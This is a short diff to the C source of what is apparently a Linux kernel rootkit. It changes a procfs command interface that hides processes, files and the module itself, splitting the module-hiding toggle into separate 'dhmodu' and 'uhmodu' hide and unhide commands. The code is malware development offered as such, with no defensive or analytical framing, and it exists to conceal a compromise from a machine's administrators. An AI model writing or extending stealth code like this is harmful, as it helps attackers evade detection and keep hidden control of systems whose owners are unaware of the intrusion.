@@ -147,7 +147,8 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
         -> uhprocXXXX  - Unhide pid from view/tasklist \n\
         ->------------------------------------------------- \n\
         -> thfile      - toggle hidden files \n\
-        -> thmodu      - toggle hidden module \n\
+        -> dhmodu      - Hide module from view \n\
+        -> uhmodu      - Unhude module from view \n\
         ->------------------------------------------------- \n\
         -> Files hidden?:: %d \n\
         -> Module hidden?: %d \n", hide_files, hide_module);
@@ -205,12 +206,13 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     {
         hide_files = !hide_files;
     }
-    else if(!strncmp(buffer, "thmodu", MIN(6, count)))
+    else if(!strncmp(buffer, "dhmodu", MIN(6, count)))
     {
-        if(hide_module)
-            module_hide();
-        else
-            module_show();
+        module_hide();
+    }
+    else if(!strncmp(buffer, "uhmodu", MIN(6, count)))
+    {
+        module_show();
     }
 
     return count;
@@ -239,7 +241,8 @@ static int __init procfs_init(void)
     -> uhprocXXXX  - Unhide pid from view/tasklist \n\
     ->------------------------------------------------- \n\
     -> thfile      - toggle hidden files \n\
-    -> thmodu      - toggle hidden module \n\
+    -> dhmodu      - Hide module from view \n\
+    -> uhmodu      - Unhude module from view \n\
     ->------------------------------------------------- \n\
     -> Files hidden?:: %d \n\
     -> Module hidden?: %d \n", hide_files, hide_module);
